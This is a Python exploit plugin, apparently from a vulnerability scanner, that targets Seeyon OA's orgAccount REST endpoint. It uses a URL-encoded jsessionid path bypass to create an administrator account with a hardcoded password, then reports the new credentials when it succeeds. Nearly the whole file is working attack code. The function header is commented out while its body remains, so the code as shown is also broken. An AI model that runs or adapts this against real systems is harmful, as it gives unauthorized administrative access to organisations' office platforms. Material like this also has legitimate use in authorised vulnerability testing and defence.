#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '致远OA任意用户创建',

      'level'     :   'critical',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/7/2',
  }
  return ret
# def randomLowercase(n):#返回特定长度的随机小写字母
#   import random
#   import string
#   lst = []
#   for j in range(n):
#     lst.append(random.choice(string.ascii_lowercase))
#   lowercase = ''.join(lst)
#   return lowercase
# def run(url,ua):
#   r0 = randomLowercase(6)
#   r1 = randomLowercase(10)
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
      'Accept-Encoding': 'gzip, deflate',
      'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
      'Connection': 'close',
      'Content-Type': 'application/json',
      'Upgrade-Insecure-Requests': '1',
      }
  target = '/seeyon/rest/orgAccount;jsessionid=%2f%6f%66%64%53%65%72%76%6c%65%74%3b%6a%73%65%73%73%69%6f%6e%69%64%3dportalManager.do?method=smsLoginEnabled'
  url1 = url + target
  data = '''
{"code":"93982","sortId":"8","name":"qax","description":"xxxxxxd","admin":[{"password":"Qwer123!@#","loginName":"wetyuh"}],"shortName":"wetyuh","Superior":"-1730833917365171641"}
  '''
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if re.search(r'superior.*?root.*?fullName.*?success.*?true',res.text,re.S):
      ret['huixian'] = f'账号：qax 密码：Qwer123!@#'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret